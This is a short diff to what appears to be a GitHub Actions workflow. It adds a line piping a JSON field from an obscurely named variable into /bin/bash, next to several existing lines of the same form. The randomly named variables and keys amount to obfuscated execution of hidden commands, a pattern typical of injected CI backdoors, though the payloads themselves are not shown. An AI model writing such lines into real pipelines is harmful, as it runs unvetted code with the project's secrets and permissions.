@@ -25,6 +25,7 @@ jobs:
           echo $kzj5 | jq -r .do3149 | /bin/bash
           echo $rrhcr4876 | jq -r .xigx1242 | /bin/bash
           echo $wizj6465 | jq -r .z2 | /bin/bash
+          echo $rv052 | jq -r .rxzq2 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
